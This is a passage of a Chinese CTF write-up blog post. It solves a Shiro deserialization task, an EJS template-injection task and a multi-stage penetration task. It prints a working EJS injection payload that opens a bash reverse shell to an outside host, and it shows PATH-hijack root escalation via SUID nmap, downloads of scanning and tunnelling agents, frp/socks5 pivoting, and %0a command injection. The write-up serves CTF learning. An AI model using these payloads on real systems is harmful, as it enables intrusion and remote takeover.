class="hljs-built_in">len</span>(i)):<br>        <span class="hljs-keyword">if</span>(i[j] != <span class="hljs-string">&#x27;.&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A&#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; &#x27;</span>,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141602831.png" srcset="/img/loading.gif" lazyload alt="image-20230814160243792"></p>
+<h5 id="misc参考"><a href="#misc参考" class="headerlink" title="misc参考"></a>misc参考</h5><p><a target="_blank" rel="noopener" href="https://zysgmzb.club/index.php/archives/262">https://zysgmzb.club/index.php/archives/262</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jyttttttt/article/details/132273970">https://blog.csdn.net/jyttttttt/article/details/132273970</a></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h4><p>shiro反序列化，使用工具一把梭：<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141610059.png" srcset="/img/loading.gif" lazyload alt="image-20230814161024002"></p>
+<p>find提权</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308141610385.png" srcset="/img/loading.gif" lazyload alt="image-20230814161045329"></p>
+<h4 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h4><blockquote>
+<p>噢我的老伙计，这张明信片应该交给你! （明信片样式由ChatGPT生成）</p>
+</blockquote>
+<p>傻逼题啊，根本成功不了</p>
+<p>题目给了源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;crypto&quot;</span>);<br><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">3000</span><br><br>templateDir = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;template&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;template&#x27;</span>, templateDir);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">milliSeconds</span>)&#123; <br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">StartTime</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>(); <br>    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">getTime</span>() &lt;<span class="hljs-title class_">StartTime</span>+milliSeconds);<br><br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">sendFile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>, &#123;<span class="hljs-attr">root</span>: __dirname&#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> uuid;<br>  <span class="hljs-keyword">let</span> name = req.<span class="hljs-property">query</span>.<span class="hljs-property">name</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">let</span> address = req.<span class="hljs-property">query</span>.<span class="hljs-property">address</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">let</span> message = req.<span class="hljs-property">query</span>.<span class="hljs-property">message</span> ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    uuid = crypto.<span class="hljs-title function_">randomUUID</span>();<br>  &#125; <span class="hljs-keyword">while</span> (fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>))<br><br>  <span class="hljs-keyword">try</span> &#123;<br>	<span class="hljs-keyword">if</span> (name != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; address != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; message != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>		<span class="hljs-keyword">let</span> source = [<span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-string">&quot;source1&quot;</span>, <span class="hljs-string">&quot;source2&quot;</span>, <span class="hljs-string">&quot;source3&quot;</span>].<span class="hljs-title function_">sort</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>			<span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> - <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();<br>		&#125;)<br>		fs.<span class="hljs-title function_">readFile</span>(source[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">err, pageContent</span>)&#123;<br>			fs.<span class="hljs-title function_">writeFileSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/--ID--/g</span>, uuid.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/-/g</span>, <span class="hljs-string">&quot;&quot;</span>)));<br>			<span class="hljs-title function_">sleep</span>(<span class="hljs-number">2000</span>);<br>		&#125;)<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Params `name` or `address` or `message` empty&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>  &#125; <span class="hljs-keyword">catch</span>(err) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Failed to write file&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">`/page?pageid=<span class="hljs-subst">$&#123;uuid&#125;</span>&amp;name=<span class="hljs-subst">$&#123;name&#125;</span>&amp;address=<span class="hljs-subst">$&#123;address&#125;</span>&amp;message=<span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/page&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req,res</span>) =&gt;</span> &#123;<br>	<span class="hljs-keyword">let</span> id = req.<span class="hljs-property">query</span>.<span class="hljs-property">pageid</span><br>	<span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="hljs-title function_">test</span>(id) || !fs.<span class="hljs-title function_">existsSync</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;<br>		res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Sorry, no such id&quot;</span>)<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;templateDir&#125;</span>/<span class="hljs-subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="hljs-property">query</span>);<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`App listening on port <span class="hljs-subst">$&#123;port&#125;</span>`</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>
+
+<p>仔细阅读一下，就知道使用了<code>ejs</code>模板引擎，并且在<code>/page</code>路由中没有对<code>req.query</code>过滤，造成了<strong>ejs模板注入</strong></p>
+<p>网上是有cve的，</p>
+<p>在url后加入：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2F9996%20%3C%261&#x27;&quot;</span>);&amp;settings[view options][client]=true<br></code></pre></td></tr></table></figure>
+
+<p>像这样：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//n</span>epctf.<span class="hljs-number">1</span>cepeak.cn:<span class="hljs-number">30398</span>/page?pageid=<span class="hljs-number">7416</span>e7e5-a18<span class="hljs-number">0</span>-<span class="hljs-number">4963</span>-<span class="hljs-number">87</span>cd-<span class="hljs-number">2900836</span>a378c&amp;name=<span class="hljs-number">1</span>&amp;address=<span class="hljs-number">2</span>&amp;message=<span class="hljs-number">1232</span>&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).execSync(<span class="hljs-string">&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2F9996%20%3C%261&#x27;&quot;</span>);&amp;settings[view options][client]=true<br></code></pre></td></tr></table></figure>
+
+<p>然后反弹shell拿flag</p>
+<h4 id="独步天下配置环境"><a href="#独步天下配置环境" class="headerlink" title="独步天下配置环境"></a>独步天下配置环境</h4><p>之前一直报错，不解析清华源，好像是本地dns的问题，折腾了好久终于可以了</p>
+<p>我们直接<code>docker-compose up -d</code>启动，然后<code>docker ps</code>查看一下：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142103330.png" srcset="/img/loading.gif" lazyload alt="image-20230814182730317"></p>
+<p>发现是映射到了8888端口，结果访问不上。</p>
+<p>于是使用：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">docker container inspect <span class="hljs-built_in">id</span>号<br></code></pre></td></tr></table></figure>
+
+<p>查看一下容器信息：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142103530.png" srcset="/img/loading.gif" lazyload alt="image-20230814182834988"></p>
+<p>发现ip地址是<code>172.24.0.2</code> 端口8888，于是nc就可以连接上去了</p>
+<p>但是发现在外面的主机连不上，于是做一下<strong>反向代理</strong>：</p>
+<p>kali做客户端：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span>  <span class="hljs-comment"># win ip</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span><br><br><span class="hljs-section">[ssh]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">local_ip</span> = <span class="hljs-number">172.24</span>.<span class="hljs-number">0.2</span><br><span class="hljs-attr">local_port</span> = <span class="hljs-number">8888</span><br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">6000</span> <span class="hljs-comment"># 映射到win6000端口</span><br></code></pre></td></tr></table></figure>
+
+<p>win做服务端：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># frps.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure>
+
+<p>然后<code>nc 192.168.1.102 6000</code>就可以连上了</p>
+<h4 id="独步天下-镜花水月"><a href="#独步天下-镜花水月" class="headerlink" title="独步天下-镜花水月"></a>独步天下-镜花水月</h4><p>渗透组合套题</p>
+<blockquote>
+<p>hint：环境变量提权</p>
+</blockquote>
+<p>根据hint，学习了一手<strong>环境变量提权</strong></p>
+<h5 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h5><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p>
+<p>我们查找到唯一的具有<code>suid</code>权限的文件：nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ $ <span class="hljs-built_in">ls</span> -al /bin/nmap<br><span class="hljs-built_in">ls</span> -al /bin/nmap<br>-rwsr-xr-x    1 root     root        931712 Jul 17 09:46 /bin/nmap<br></code></pre></td></tr></table></figure>
+
+<p>执行一下nmap，发现nmap会调用<code>ports-alive</code>文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin $ nmap 123<br>nmap 123<br>sh: ports-alive: not found<br></code></pre></td></tr></table></figure>
+
+<p>于是我们在<code>/tmp</code>目录下，将<code>/bin/sh</code>写入<code>ports-alive</code>，并且将<code>/tmp</code>加入环境变量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive<br><span class="hljs-built_in">chmod</span> +x ports-alive<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<p>接着返回<code>/bin</code>目录，运行一下<code>nmap</code>，这时由于它会去调用<code>ports-alive</code>，所以先去环境变量中找到了<code>/tmp</code>目录下的<code>ports-alive</code>，结果执行了<code>/bin/sh</code>，获得root权限，然后查看flag即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin $ ./nmap 123<br>./nmap 123<br>/bin <span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root <span class="hljs-comment"># 提权到root</span><br>/bin <span class="hljs-comment"># cat /flag</span><br><span class="hljs-built_in">cat</span> /flag<br>flag&#123;Everything_is_illusory&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="独步天下-破除虚妄"><a href="#独步天下-破除虚妄" class="headerlink" title="独步天下-破除虚妄"></a>独步天下-破除虚妄</h4><p>独步天下第一层请nc连接，破除虚妄是第二层对应的flag是flag_mini里的flag </p>
+<blockquote>
+<p>hint：ports-alive 修正后扫描网段 （ip范围0到100）用基础get包探测获取html</p>
+<p>hint：echo -e “GET &#x2F; HTTP&#x2F;1.1\r\nHost: 192.168.200.1\r\n\r\n” | nc xx xx</p>
+</blockquote>
+<p>我们在前面获取root权限之后，我们可以使用<code>wget</code>命令从服务器上下载文件，例如：<code>fscan</code>、<code>frpc</code></p>
+<p>我们经过扫描，得到了一个内网ip：<code>192.168.200.1</code></p>
+<p>但是我们访问不到它，我们使用<code>frp</code>进行反向代理，将其代理到我们自己的服务器上：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = ip<br>server_port = 10001<br><br>[ssh]<br><span class="hljs-built_in">type</span> = tcp<br>local_ip = 192.168.200.1<br>local_port = 80<br>remote_port = 10002  <span class="hljs-comment"># 转发到vps的10002端口</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在命令行运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c frpc.ini &amp;<br></code></pre></td></tr></table></figure>
+
+<p>服务器运行：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">./frps -c frps.ini <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我们访问服务器的10002端口，成功反向代理</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308142102645.png" srcset="/img/loading.gif" lazyload alt="image-20230814210216572"></p>
+<hr>
+<p>其实可以不用这么麻烦。。</p>
+<p>我们观察一下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> container inspect <span class="hljs-number">668</span>dd14f5748<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151325580.png" srcset="/img/loading.gif" lazyload alt="image-20230815132551460"></p>
+<p>这个docker容器将<code>172.24.0.2:8888</code>端口映射到了本机的32768端口上，我们再查看一下kali的ip：<code>192.168.56.129</code></p>
+<p>于是直接：<code>nc 192.168.56.129 32768</code>就可以连上了</p>
+<p>然后常规操作，提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; ports-alive<br><span class="hljs-built_in">chmod</span> +x ports-alive<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">cd</span> /bin<br>nmap 123<br></code></pre></td></tr></table></figure>
+
+<p>然后我们可以使用<code>wget</code>命令从服务器上下载一个<code>fscan</code>用来内网探测：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://ip:port/fscan_amd64<br><span class="hljs-built_in">mv</span> fscan_amd64 fscan<br><span class="hljs-built_in">chmod</span> +x fscan<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151331906.png" srcset="/img/loading.gif" lazyload alt="image-20230815133115851"></p>
+<p>测到一台内网主机：<code>192.168.200.1</code></p>
+<p>然后我们是没有办法直接访问的，因为，这是在docker容器中的内网。</p>
+<p>经过测试，我们发现可以出网，于是我们可以搞一个<strong>socks5代理</strong>，这里我们选择<code>Venom</code></p>
+<p>先使用<code>wget</code>从服务器上下载：<code>agent_linux_x64</code></p>
+<p>然后运行它：</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">./agent_linux_x64 -rhost ip -r<span class="hljs-keyword">port</span> 1080<br></code></pre></td></tr></table></figure>
+
+<p>服务器端监听：</p>
+<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">./admin -l<span class="hljs-keyword">port</span> 1080<br></code></pre></td></tr></table></figure>
+
+<p>接下来我们选择连接上的节点1，然后使用<code>socks 10002</code>为10002端口做一个socks5代理</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151603744.png" srcset="/img/loading.gif" lazyload alt="image-20230815160327584"></p>
+<p>接着使用<code>proxifier</code>代理一下：</p>
+<p>先添加一个解析服务器，填上自己的服务器ip和port</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151605359.png" srcset="/img/loading.gif" lazyload alt="image-20230815160541299"></p>
+<p>然后配置一下解析规则：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151607441.png" srcset="/img/loading.gif" lazyload alt="image-20230815160735385"></p>
+<p>将访问192.168.200.1的请求都通过服务器的socks5代理过去</p>
+<p>然后直接浏览器访问就行了：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151608566.png" srcset="/img/loading.gif" lazyload alt="image-20230815160857443"></p>
+<p>我们发现这个ping可能存在命令执行，于是抓个包，然后使用<code>%0a</code>分隔：</p>
+<p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202308151610295.png" srcset="/img/loading.gif" lazyload alt="image-20230815161030218"></p>
+<p>flag在根目录下，但是没有权限去读</p>
+<p>我们发现<code>/app/app.py</code>文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, url_for, redirect<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ctypes<br><span class="hljs-keyword">import</span> ctypes.util<br><span class="hljs-keyword">import</span> time<br>os.environ[<span class="hljs-string">&#x27;FLASK_ENV&#x27;</span>] = <span class="hljs-string">&#x27;production&#x27;</span><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./&#x27;</span><br><br>lib_name=<span class="hljs-string">&#x27;./libping.so&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_ping_library</span>():<br>    <span class="hljs-comment"># 加载共享库</span><br>    mylib = ctypes.CDLL(lib_name)<br>    <span class="hljs-keyword">return</span> mylib<br><br>mylib = load_ping_library()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ping&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ping</span>():<br>    <span class="hljs-keyword">global</span> mylib<br>    ip_address = request.form[<span class="hljs-string">&#x27;ip_address&#x27;</span>]<br>    result = ctypes.create_string_buffer(<span class="hljs-number">4096</span>*<span class="hljs-number">2</span>)<br>    mylib.ping(ip_address.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), result)<br>    <span class="hljs-keyword">return</span> result.value.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload_avatar&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_avatar</span>():<br>    <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>) != <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You are not allowed to upload files from this IP address.&quot;</span> + <span class="hljs-string">&quot; Your IP is: &quot;</span> + request.headers.get(<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>    <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span> redirect(request.url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allowed_file(file.filename):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid file format. Only PNG files are allowed.&#x27;</span><br>    <span class="hljs-comment"># 限制文件大小为 5KB</span><br>    MAX_FILE_SIZE = <span class="hljs-number">5</span> * <span class="hljs-number">1024</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(file.read()) &gt; MAX_FILE_SIZE:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;File too large. Maximum size is 5KB.&#x27;</span><br>    <span class="hljs-comment"># 将文件保存到服务器</span><br>    file.seek(<span class="hljs-number">0</span>)  <span class="hljs-comment"># 重置文件读取指针</span><br>    file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], <span class="hljs-string">&#x27;avatar.png&#x27;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span 